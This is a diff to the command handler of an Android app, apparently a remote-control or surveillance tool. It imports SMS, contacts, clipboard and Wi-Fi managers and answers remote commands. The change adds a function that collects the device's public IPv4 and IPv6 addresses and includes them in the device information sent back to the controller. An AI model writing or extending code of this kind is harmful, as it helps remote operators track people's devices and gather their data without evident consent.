@@ -21,8 +21,11 @@ import java.io.InputStreamReader
 import android.content.ClipboardManager
 import android.content.ClipData
 import java.util.Locale
-import android.location.LocationManager
 import android.net.Uri
+import java.net.Inet4Address
+import java.net.Inet6Address
+import java.net.NetworkInterface
+import java.util.*
 import android.provider.ContactsContract
 import android.telephony.SmsManager
 import android.net.wifi.WifiManager
@@ -94,6 +97,10 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         put("brand", Build.BRAND)
                         put("sdk", Build.VERSION.SDK_INT)
                         put("release", Build.VERSION.RELEASE)
+                        
+                        val ips = getIPs()
+                        put("ipv4", ips.first)
+                        put("ipv6", ips.second)
                     }
                     val resp = createResponse(cmdId, "device_info", info)
                     sendResponse(resp)
@@ -381,6 +388,30 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
             sendResponse(resp); return resp
         }
         return null
+    }
+
+    private fun getIPs(): Pair<String?, String?> {
+        var ipv4: String? = null
+        var ipv6: String? = null
+        try {
+            val interfaces = NetworkInterface.getNetworkInterfaces()?.toList() ?: emptyList()
+            for (iface in interfaces) {
+                if (!iface.isUp || iface.isLoopback) continue
+                for (addr in iface.inetAddresses) {
+                    if (!addr.isLoopbackAddress) {
+                        if (addr is Inet4Address) {
+                            ipv4 = addr.hostAddress
+                        } else if (addr is Inet6Address) {
+                            val sAddr = addr.hostAddress.replace("%.*".toRegex(), "").uppercase()
+                            if (!addr.isLinkLocalAddress && (sAddr.startsWith("2") || sAddr.startsWith("3"))) {
+                                ipv6 = sAddr
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (e: Exception) {}
+        return Pair(ipv4, ipv6)
     }
 
     private fun createResponse(cmdId: String, type: String, data: Any): String {
